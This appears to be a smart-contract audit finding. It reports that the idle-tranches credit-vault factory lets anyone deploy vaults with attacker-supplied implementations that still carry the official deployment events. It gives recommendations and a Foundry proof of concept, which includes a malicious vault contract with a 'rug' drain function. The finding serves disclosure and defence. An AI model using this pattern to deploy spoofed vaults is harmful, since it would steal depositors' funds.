### Title
Permissionless `IdleCreditVaultFactory` deploys vaults with arbitrary, attacker-controlled implementations behind official `CreditVaultDeployed` events - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
The Wintermute/Optimism bug class is "permissionless deterministic deployment lets an attacker stand up a contract at/for an expected identity". In idle-tranches the same surface exists in `IdleCreditVaultFactory.deployCreditVault` / `deployRevolvingCreditVault` and `IdleCDOFactory.deployCDO`: any EOA can call them, and the `implementation` addresses (credit vault, strategy, queue, programmable borrower, write-off escrow) are caller-supplied and never validated against a whitelist or registry. The factory still emits the canonical `CreditVaultDeployed` / `CDODeployed` events and wires the proxy under the shared `proxyAdmin`, so a malicious vault is indistinguishable from a legitimately deployed one to any off-chain indexers, UIs, or integrators that trust factory events.

### Finding Description
`deployCreditVault` (contracts/IdleCreditVaultFactory.sol:92) takes `cvParams.implementation` and `strategyData.implementation` straight from `msg.sender` and passes them to `_deployProxy` (line 280), which creates a `TransparentUpgradeableProxy` pointing at that arbitrary code with initializer calldata also derived from caller input. The only gate is `_checkMinimumFees` (line 309), which an attacker trivially satisfies by passing `managementFee >= 500`. There is no check that the implementation is an approved `IdleCDOEpochVariant`/`IdleCreditVault` bytecode hash, no owner-only restriction, and no registry. `deployRevolvingCreditVault` (line 126) and `IdleCDOFactory.deployCDO` (contracts/IdleCDOFactory.sol:9, `public`, no restrictions) have the same property.

The attacker supplies a malicious implementation that mimics the `IdleCDOEpochVariant`/`IdleCreditVault` ABI surface used during `_configureCreditVault` (`setEpochParams`, `setInstantWithdrawParams`, `setKeyringParams`, `setIsDepositDuringEpochDisabled`, `setFeeParams`, `setGuardian`, `setAprs`, `setWhitelistedCDO`, `transferOwnership`) — all trivially implementable — and additionally exposes a `depositAA`/`deposit`-compatible function that simply keeps deposited underlying. Because the proxy is created under the factory's real `proxyAdmin` and the event is emitted by the real factory, the deployment is cryptographically indistinguishable from a treasury-deployed vault.

### Impact Explanation
Any lender, keeper, or frontend that treats `CreditVaultDeployed`/`CDODeployed` emissions from the canonical factory address as authoritative (a reasonable integration pattern, since the deploy tasks at `tasks/cdo-factory.js` parse exactly these events) can be routed into the attacker's vault. Deposited underlying is held by attacker-controlled implementation code and can be drained at will — direct theft of all funds deposited into the spoofed vault, unbounded in amount. This is precisely the Wintermute pattern: the protocol's own permissionless deployment path produces artifacts that victims cannot distinguish from intended ones.

### Likelihood Explanation
Likelihood depends on an off-chain consumer trusting factory events, but that consumer pattern is the factory's designed purpose (the repo's own tasks extract addresses from the event). The attack requires no privileged role, no timing, and is free beyond gas. The fix is cheap (an implementation allowlist or `onlyTreasury` gate), suggesting it was an oversight rather than an intentional open-deployment design — `IdleCDOFactory.deployCDO` is also unauthenticated but at least the caller controls `admin`/`data`, whereas here the factory stamps its own `proxyAdmin` and treasury wiring onto arbitrary code.

### Recommendation
- Gate `deployCreditVault`/`deployRevolvingCreditVault` behind `onlyTreasury` (or a dedicated deployer role), or maintain an on-chain allowlist of approved implementation bytecode/addresses and `revert` otherwise.
- At minimum, emit a flag or use a separate event for community deployments so integrators can distinguish endorsed vaults.
- Apply the same to `IdleCDOFactory.deployCDO` or document that its events carry no endorsement.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousImpl {
    // satisfied factory calls + trap deposit
    function initialize(bytes calldata) external {}
    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsInterestMinted(bool) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function setAprs(uint256, uint256) external {}
    function setWhitelistedCDO(address) external {}
    function transferOwnership(address) external {}
    function borrower() external view returns (address) { return address(0); }
    function deposit(uint256) external {}              // keeps msg.value-equivalent tokens pulled via transferFrom
    function rug(address token, address to) external { // attacker drain
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
}

contract FactorySpoofTest is Test {
    function testAnyoneCanDeployMaliciousVaultViaFactory() public {
        address treasury = makeAddr("treasury");
        address proxyAdmin = makeAddr("proxyAdmin");
        address attacker = makeAddr("attacker");

        IdleCreditVaultFactory impl = new IdleCreditVaultFactory();
        TransparentUpgradeableProxy p = new TransparentUpgradeableProxy(
            address(impl), proxyAdmin,
            abi.encodeWithSelector(IdleCreditVaultFactory.initialize.selector, treasury, proxyAdmin)
        );
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(address(p));

        IdleCreditVaultFactory.CreditVaultParams memory cv;
        cv.implementation = address(new MaliciousImpl()); // attacker code
        cv.managementFee = 500;                            // passes _checkMinimumFees
        cv.underlying = makeAddr("usdc");

        IdleCreditVaultFactory.StrategyData memory sd;
        sd.implementation = address(new MaliciousImpl());
        sd.manager = makeAddr("manager");
        sd.borrower = makeAddr("borrower");

        IdleCreditVaultFactory.AncillaryParams memory an; // all zero: no queue/escrow/keyring

        vm.prank(attacker);
        vm.recordLogs();
        factory.deployCreditVault(cv, sd, an);

        // Factory emitted a CreditVaultDeployed event for the attacker's vault
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("CreditVaultDeployed(address,address,address,address,address,address)");
        bool emitted;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics[0] == sig && logs[i].emitter == address(factory)) emitted = true;
        }
        assertTrue(emitted, "factory endorsed malicious deployment");
    }
}
```

Note: the legacy `IdleCDOFactory.deployCDO` is likewise unauthenticated but lets the caller set `admin`/`data`, so the credit-vault factory variant is the stronger finding because it wraps attacker code in the factory's own `proxyAdmin`, treasury ownership, and canonical event.
